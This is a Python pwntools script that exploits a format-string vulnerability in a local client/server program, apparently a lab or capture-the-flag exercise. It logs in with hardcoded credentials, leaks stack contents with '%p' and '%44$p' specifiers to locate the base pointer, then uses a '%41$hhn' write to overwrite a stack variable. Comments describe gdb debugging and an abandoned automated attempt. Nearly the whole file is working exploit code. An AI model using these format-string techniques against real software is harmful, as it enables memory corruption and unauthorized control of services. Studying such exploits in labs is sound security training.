from pwn import *

context.clear(arch = 'amd64')
# Note that this script works even when ASLR is enabled.

server = process('bin/server')
client = process(['bin/client', '127.0.0.1', '1337'])

login = "login Acidburn\n"
passw = "pass CrashOverride\n"

client.sendline(login)
client.sendline(passw)
log.info("server after login %s" % server.recv(timeout=0.5))
log.info("client after login %s" % client.recv(timeout=0.5))

# --- Code that was used to attempt automatic exploitation
# Create a FmtStr object and give to him the function
#format_string = FmtStr(execute_fmt=send_payload, padlen=4)
#format_string.write(0x00007fffffffcd58, 0xAAAAAAAAAAAAAAAA) # write 0x1337babe at 0x0
# format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
# format_string.execute_writes()

def exectue_one(string):
    # Create file with that filename, to pass the programm's checks
    open(string, 'a').close()
    client.sendline(string)
    # client.recv() FIXME throws EOF ERROR
    return server.recv()

def get_stack(size):
    #s = 'get %' + str(i) + '$11x'
    s = 'put ' + 'a%p.'*size + "187"
    client.sendline(s)
    res = server.recv()
    stack = res.split('.')
    client.recv()
    return stack

# Step 0 : Analyze Stack to find local vriables location
#           (relative to format string execution)

# long long n is at %40$p
# long long fileSize at %41$p

# in GDB: stack address of long long n: 0x7fffffffce90 = 140737488342672
# in python: something else..
# normal: something else..
# gdb making sure same env variables: 0x7fffffffcec0 = 140737488342720
# (gdb) unset environment LINES
# (gdb) unset environment COLUMNS

# We realize that the stack is still different depending on how programm executed !

# We thus create a precomputation step to first find the stack location
entire_pipeline = True

# Step 1: find stack location
if entire_pipeline:
    s = "put a"
    s  += "%44$p"
    s += " " + str(187) # writes 0xbb (don't care value)

    res = exectue_one(s)
    rbp = int(res.split('a')[1],16)
    offset = 0x570 # Found manually in gdb
    i_address = rbp - offset
    # print "rbp: " + res.split('a')[1][:-1] + " integer: " + str(i_address)

# Step 2: Actual exploit, by changing i value
s  = "put a%41$hhn"

if entire_pipeline:
    s += " " + str(i_address) # address of rip 0x00007fffffffcb58 // a8 : str(140737488341928)
else:
    manual_base_pointer_value = "0x7fffffffd470"
    s += " " + str(int(manual_base_pointer_value, 16) - 0x570)

res = exectue_one(s)
print res

# Get final output
#log.info("server cleanup %s" % server.recv())
#log.info("client cleanup %s" % client.recv())

# Clean up
client.close()
server.close()
